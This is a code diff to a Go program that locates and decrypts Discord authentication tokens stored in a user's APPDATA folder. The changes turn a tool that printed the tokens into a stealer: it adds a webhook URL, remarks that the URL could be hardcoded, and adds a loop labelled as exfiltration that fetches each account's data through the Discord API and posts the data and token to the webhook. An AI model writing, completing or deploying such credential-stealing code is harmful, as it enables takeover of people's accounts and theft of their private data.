@@ -5,7 +5,6 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"encoding/base64"
-	"fmt"
 	"log"
 	"os"
 	"path"
@@ -18,10 +17,17 @@ import (
 	"github.com/tidwall/gjson"
 )
 
-// Define regex search pattern to find encrypted Discord tokens
-const regexPattern = `dQw4w9WgXcQ:([^\"]*)`
-// Get the folder path to where Discord stores its data
-var appdataDir = filepath.ToSlash(os.Getenv("APPDATA"))
+const (
+	// Define regex search pattern to find encrypted Discord tokens
+	regexPattern = `dQw4w9WgXcQ:([^\"]*)`
+)
+var (
+	// Get the folder path to where Discord stores its data
+	appdataDir = filepath.ToSlash(os.Getenv("APPDATA"))
+	// Define Discord webhook URL to send tokens to. I have it set to an environment variable
+	// for testing, but you could always make this a const with an actual webhook URL
+	webhookUrl = os.Getenv("webhookUrl")
+)
 
 // This function gets all possible file paths that may contain encrypted Discord tokens.
 // Outputs are a slice of strings containing the file paths and an error if encountered.
@@ -166,15 +172,20 @@ func main() {
 		if err != nil {log.Fatal(err)}
 
 	// Decrypt any tokens found and add them to a list
-	var output []string
+	var decryptedTokens []string
 	for _, encryptedToken := range encryptedTokens {
 		decryptedToken, err := decryptDiscordToken(encryptedToken, decryptionKey)
 			if err != nil {log.Fatal(err)}
-		output = append(output, decryptedToken)
+		decryptedTokens = append(decryptedTokens, decryptedToken)
 	}
-	output = slices.Compact(output) // The token may be stored multiple times in different files, so we remove duplicate values
+	decryptedTokens = slices.Compact(decryptedTokens) // The token may be stored multiple times in different files, so we remove duplicate values
 
-	for i, token := range output {
-		fmt.Printf("Token %v: %v\n", i+1, token)
+	// Exfiltrate account data
+	for _, token := range decryptedTokens {
+		account, err := getAccountData(token) // Use the Discord API to get user data about the account
+			if err != nil {log.Fatal(err)}
+		account.Token = token // Add the token value to the data from the user API
+		webhookErr := sendAccountDataToWebhook(account, webhookUrl)	// Have to use new error value
+			if webhookErr != nil {log.Fatal(webhookErr)}			// here - kinda dumb but whatever
 	}
 }
